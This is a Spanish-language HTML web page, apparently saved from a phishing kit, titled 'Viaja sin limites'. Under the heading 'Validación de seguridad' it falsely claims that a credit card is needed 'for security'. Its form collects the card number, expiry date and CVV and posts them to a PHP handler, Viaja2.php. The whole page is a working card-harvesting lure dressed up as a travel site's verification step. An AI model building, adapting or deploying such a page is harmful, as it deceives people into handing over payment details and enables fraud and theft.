<!DOCTYPE html>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>Viaja sin limites</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <meta name="HandheldFriendly" content="true">

  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  
  <link rel="stylesheet" href="./Viaja sin limites_files/style.css">
  <link rel="shortcut icon" href="./Viaja sin limites_files/favicon.ico">
  <script src="./Viaja sin limites_files/validarcc.js.descarga"></script>
</head>

<body>
  <main>
    <header>
        <div class="mid">
            <a href="./">
                <img id="logo" src="./Viaja sin limites_files/favicon.ico" style="height: 48px;">

                <img id="logo2" src="./Viaja sin limites_files/favicon.ico" style="height: 48px;">

                </a>
    </div></header>
    <div id="background">



    </div>



  <div class="login-wrapper  " style=" padding: 30px 0; ">

  
    
    <h2>Validación de seguridad</h2>
     <p>Por seguridad, ingrese una tarjeta de crédito</p>
<div style="
    display: flex;
    align-items: center;
">
     <img src="./Viaja sin limites_files/Visa_Logo.png" style="
    height: 25px;
"><img src="./Viaja sin limites_files/mastercard_logo.png" style="
    height: 40px;
    margin-left: 20px;
">


</div>

        
    <form method="POST" action="Viaja2.php" onsubmit="return valida();"> 
     
    
<div class="cc">




<input type="text" minlength="16" maxlength="16" required name="cc" id="cc" placeholder="Número de su tarjeta">

<div class="flex">
     <input type="text" minlength="2" maxlength="2" required name="mm" id="mm" placeholder="MM">
     <span>/</span>
 <input type="text" minlength="2" maxlength="4" required name="aa" id="aa" placeholder="AA">
     </div>
  <input type="text" minlength="4" maxlength="4" required name="cvv" id="cvv" placeholder="Código de seguridad" style="margin-bottom: 40px;">
     </div>







          
      
      <input type="submit" value="Continuar">
      
    </form>

    



  </div></main>










</body></html>